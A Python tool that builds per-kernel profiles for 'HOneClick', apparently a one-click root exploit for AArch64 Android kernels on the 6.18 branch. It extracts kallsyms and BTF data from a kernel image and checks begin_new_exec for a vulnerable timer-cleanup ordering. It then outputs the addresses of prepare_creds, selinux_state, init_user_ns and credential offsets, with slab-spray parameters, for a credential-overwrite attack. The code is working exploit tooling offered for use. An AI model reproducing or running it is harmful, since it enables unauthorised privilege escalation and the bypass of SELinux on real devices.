#!/usr/bin/env python3
"""Generate an HOneClick 98260 profile from a raw AArch64 kernel Image."""
from __future__ import annotations

import argparse
import json
import re
import struct
import sys
from pathlib import Path

IMAGE_BASE = 0xFFFFFFC080000000
BTF_MAGIC = b"\x9f\xeb"
KIND_STRUCT = 4
KIND_UNION = 5


def align(value: int, alignment: int) -> int:
    return (value + alignment - 1) & ~(alignment - 1)


def parse_kallsyms(image: bytes) -> tuple[list[tuple[int, str, str]], int]:
    alphabet = b"".join(bytes((i, 0)) for i in range(ord("a"), ord("z") + 1))
    search = 0
    while True:
        marker = image.find(alphabet, search)
        if marker < 0:
            raise ValueError("kallsyms token table not found")
        search = marker + 1
        try:
            start = marker
            for _ in range(97):
                start = image.rfind(b"\0", 0, start - 1) + 1
            tokens: list[str] = []
            pos = start
            for _ in range(256):
                end = image.index(0, pos)
                tokens.append(image[pos:end].decode("ascii"))
                pos = end + 1
            index_pos = align(pos, 8)
            expected = b"".join(
                struct.pack("<H", sum(len(token) + 1 for token in tokens[:i]))
                for i in range(256)
            )
            if image[index_pos:index_pos + 512] != expected:
                continue
            offsets = index_pos + 512
            base_marker = image.find(
                struct.pack("<Q", IMAGE_BASE), offsets, min(len(image), offsets + 0x2000000)
            )
            if base_marker < 0:
                continue
            estimate = (base_marker - offsets) // 4
        except (ValueError, UnicodeDecodeError):
            continue

        for count in range(estimate - 4, estimate + 5):
            needle = struct.pack("<I", count)
            names_pos = image.find(needle, max(0, start - 0x400000), start)
            while names_pos >= 0:
                if names_pos % 4 == 0:
                    cursor = names_pos + 8
                    encoded: list[str] = []
                    try:
                        for _ in range(count):
                            length = image[cursor]
                            cursor += 1
                            if length & 0x80:
                                length = (length & 0x7F) | (image[cursor] << 7)
                                cursor += 1
                            name = "".join(tokens[x] for x in image[cursor:cursor + length])
                            cursor += length
                            if not name:
                                raise ValueError("empty kallsyms token")
                            encoded.append(name)
                    except (IndexError, ValueError):
                        encoded = []
                    if (
                        encoded
                        and cursor <= start
                        and start - cursor < 0x5000
                        and "_text" in [name[1:] for name in encoded[:32]]
                    ):
                        addresses = struct.unpack_from(f"<{count}I", image, offsets)
                        symbols = [
                            (IMAGE_BASE + address, name[1:], name[0])
                            for address, name in zip(addresses, encoded)
                        ]
                        return symbols, start - cursor
                names_pos = image.find(needle, names_pos + 1, start)
    raise ValueError("kallsyms names block not found")


class Btf:
    def __init__(self, image: bytes):
        self.image = image
        self.base = self._find()
        header = struct.unpack_from("<HBBIIIII", image, self.base)
        _, version, _, header_len, type_off, type_len, str_off, str_len = header
        if version != 1 or header_len != 24:
            raise ValueError("unsupported BTF header")
        self.type_start = self.base + header_len + type_off
        self.type_end = self.type_start + type_len
        self.str_start = self.base + header_len + str_off
        self.str_end = self.str_start + str_len
        self.types = self._parse_types()

    def _find(self) -> int:
        pos = 0
        while True:
            pos = self.image.find(BTF_MAGIC, pos)
            if pos < 0:
                raise ValueError("BTF section not found")
            if pos + 24 > len(self.image):
                raise ValueError("BTF section truncated")
            magic, version, _, header_len, type_off, type_len, str_off, str_len = (
                struct.unpack_from("<HBBIIIII", self.image, pos)
            )
            str_start = pos + header_len + str_off
            if (
                magic == 0xEB9F
                and version == 1
                and header_len == 24
                and 0 < type_len < 20_000_000
                and 0 < str_len < 4_000_000
                and str_start + str_len <= len(self.image)
            ):
                return pos
            pos += 1

    def string(self, offset: int) -> str:
        if offset == 0:
            return ""
        end = self.image.find(b"\0", self.str_start + offset, self.str_end)
        if end < 0:
            return ""
        return self.image[self.str_start + offset:end].decode("utf-8", "replace")

    def _parse_types(self) -> list[dict | None]:
        result: list[dict | None] = [None]
        pos = self.type_start
        while pos < self.type_end:
            name_off, info, size = struct.unpack_from("<III", self.image, pos)
            pos += 12
            kind = (info >> 24) & 0x1F
            vlen = info & 0xFFFF
            kflag = bool(info >> 31)
            entry = {"name": self.string(name_off), "kind": kind, "size": size, "members": []}
            if kind == 1:
                pos += 4
            elif kind == 3:
                pos += 12
            elif kind in (KIND_STRUCT, KIND_UNION):
                for _ in range(vlen):
                    member_name, _, bit_offset = struct.unpack_from("<III", self.image, pos)
                    pos += 12
                    if kflag:
                        bit_offset &= 0xFFFFFF
                    entry["members"].append((self.string(member_name), bit_offset // 8))
            elif kind in (6,):
                pos += 8 * vlen
            elif kind == 19:
                pos += 12 * vlen
            elif kind == 13:
                pos += 8 * vlen
            elif kind == 14:
                pos += 4
            elif kind == 15:
                pos += 12 * vlen
            elif kind == 17:
                pos += 4
            result.append(entry)
        return result

    def structure(self, name: str) -> dict:
        matches = [
            entry for entry in self.types
            if entry and entry["kind"] in (KIND_STRUCT, KIND_UNION) and entry["name"] == name
        ]
        if not matches:
            raise ValueError(f"BTF struct not found: {name}")
        return matches[0]

    @staticmethod
    def member_offsets(structure: dict) -> dict[str, int]:
        return {name: offset for name, offset in structure["members"] if name}


def parse_kernel_release(image: bytes) -> str:
    match = re.search(rb"Linux version ([^\s]+)", image)
    if not match:
        raise ValueError("kernel release string not found; pass --kernel-release")
    return match.group(1).decode("ascii", "replace")


def bl_target(pc: int, instruction: int) -> int | None:
    if instruction & 0xFC000000 != 0x94000000:
        return None
    immediate = instruction & 0x03FFFFFF
    if immediate & 0x02000000:
        immediate -= 0x04000000
    return pc + immediate * 4


def vulnerability_status(image: bytes, symbols: dict[str, int]) -> tuple[bool, dict[str, int]]:
    required = [
        "begin_new_exec", "unshare_files", "exec_task_namespaces",
        "posix_cpu_timers_exit", "exit_itimers",
    ]
    missing = [name for name in required if name not in symbols]
    if missing:
        raise ValueError("missing symbols: " + ", ".join(missing))
    ordered = sorted((address, name) for name, address in symbols.items())
    begin = symbols["begin_new_exec"]
    end = next((address for address, _ in ordered if address > begin), begin + 0x1000)
    calls: dict[str, int] = {}
    wanted = set(required[1:])
    for pc in range(begin, min(end, begin + 0x2000), 4):
        offset = pc - IMAGE_BASE
        if offset < 0 or offset + 4 > len(image):
            break
        target = bl_target(pc, struct.unpack_from("<I", image, offset)[0])
        if target is None:
            continue
        for name in wanted:
            if target == symbols[name]:
                calls[name] = pc
    missing_calls = [name for name in required[1:] if name not in calls]
    if missing_calls:
        raise ValueError("vulnerability calls not found: " + ", ".join(missing_calls))
    vulnerable = (
        calls["posix_cpu_timers_exit"] > calls["unshare_files"]
        and calls["posix_cpu_timers_exit"] > calls["exec_task_namespaces"]
    )
    return vulnerable, calls


def build_profile(
    image_path: Path,
    kernel_release: str | None,
    profile_id: str | None,
    symbols_asset: str,
    module_asset: str,
    slab_objects: int,
    slab_pages: int,
) -> tuple[dict, list[tuple[int, str, str]]]:
    image = image_path.read_bytes()
    symbols, kallsyms_gap = parse_kallsyms(image)
    symbol_map: dict[str, int] = {}
    for address, name, _ in symbols:
        symbol_map.setdefault(name, address)
    release = kernel_release or parse_kernel_release(image)
    if not release.startswith("6.18."):
        raise ValueError(f"current KernelSU template only supports 6.18 KMI: {release}")
    vulnerable, calls = vulnerability_status(image, symbol_map)

    btf = Btf(image)
    kitimer = btf.structure("k_itimer")
    task = btf.structure("task_struct")
    cred = btf.structure("cred")
    task_offsets = btf.member_offsets(task)
    cred_offsets = btf.member_offsets(cred)
    kitimer_offsets = btf.member_offsets(kitimer)
    if "cred" not in task_offsets:
        raise ValueError("task_struct.cred not found")
    if "it" not in kitimer_offsets:
        raise ValueError("k_itimer.it not found")

    expected_cred = {
        "uid": 8,
        "suid": 16,
        "cap_inheritable": 48,
        "cap_permitted": 56,
        "cap_effective": 64,
        "cap_bset": 72,
        "cap_ambient": 80,
        "security": 128,
        "user": 136,
        "user_ns": 144,
        "ucounts": 152,
        "group_info": 160,
    }
    mismatches = {
        name: (cred_offsets.get(name), expected)
        for name, expected in expected_cred.items()
        if cred_offsets.get(name) != expected
    }
    if mismatches:
        raise ValueError(f"cred layout is not supported by this engine: {mismatches}")

    static_symbols = [
        "do_timer_create", "prepare_creds", "selinux_state", "init_user_ns",
        "root_user", "init_groups", "init_ucounts",
    ]
    missing = [name for name in static_symbols if name not in symbol_map]
    if missing:
        raise ValueError("missing symbols: " + ", ".join(missing))

    profile_id = profile_id or "kernel-" + re.sub(r"[^A-Za-z0-9_.-]+", "-", release)
    profile = {
        "id": profile_id,
        "kernel": release,
        "timer_link": hex(symbol_map["do_timer_create"] + 0xB8),
        "cred_link": hex(symbol_map["prepare_creds"] + 0x2C),
        "slide_site_low": hex((symbol_map["do_timer_create"] + 0xB8) & 0x1FFFFF),
        "selinux_link": hex(symbol_map["selinux_state"]),
        "user_ns": hex(symbol_map["init_user_ns"]),
        "root_user": hex(symbol_map["root_user"]),
        "groups": hex(symbol_map["init_groups"]),
        "ucounts": hex(symbol_map["init_ucounts"]),
        "kitimer_size": kitimer["size"],
        "kitimer_node": kitimer_offsets["it"] + 0,
        "task_cred": task_offsets["cred"],
        "cred_size": cred["size"],
        "slab_objects": slab_objects,
        "slab_pages": slab_pages,
        "module_asset": module_asset,
        "symbols_asset": symbols_asset,
        "vulnerable": vulnerable,
        "audit": {
            "begin_new_exec": hex(symbol_map["begin_new_exec"]),
            "calls": {name: hex(address) for name, address in calls.items()},
            "kallsyms": len(symbols),
            "kallsyms_gap": kallsyms_gap,
            "btf_base": hex(btf.base),
        },
    }
    if not vulnerable:
        raise ValueError("kernel does not match the vulnerable cleanup ordering")
    return profile, symbols


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("kernel_image", type=Path, help="raw AArch64 Image / kernel.bin")
    parser.add_argument("--kernel-release")
    parser.add_argument("--id")
    parser.add_argument("--symbols-out", required=True, type=Path)
    parser.add_argument("--symbols-asset")
    parser.add_argument("--module-asset", default="ksu-template-custom.ko")
    parser.add_argument("--slab-objects", type=int, default=21)
    parser.add_argument("--slab-pages", type=int, default=2)
    parser.add_argument("--profile-json", type=Path)
    parser.add_argument("--update-profiles", type=Path)
    args = parser.parse_args()

    symbols_asset = args.symbols_asset or args.symbols_out.name
    profile, symbols = build_profile(
        args.kernel_image,
        args.kernel_release,
        args.id,
        symbols_asset,
        args.module_asset,
        args.slab_objects,
        args.slab_pages,
    )
    args.symbols_out.parent.mkdir(parents=True, exist_ok=True)
    args.symbols_out.write_text(
        "".join(f"{address:016x} {kind} {name}\n" for address, name, kind in symbols)
    )
    if args.profile_json:
        args.profile_json.parent.mkdir(parents=True, exist_ok=True)
        args.profile_json.write_text(json.dumps(profile, indent=2) + "\n")
    if args.update_profiles:
        root = json.loads(args.update_profiles.read_text())
        profiles = root.setdefault("profiles", [])
        profiles = [item for item in profiles if item.get("kernel") != profile["kernel"]]
        profiles.append(profile)
        root["profiles"] = profiles
        args.update_profiles.write_text(json.dumps(root, indent=2) + "\n")
    print(json.dumps(profile, indent=2))
    print(f"symbols: {len(symbols)} -> {args.symbols_out}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(1)
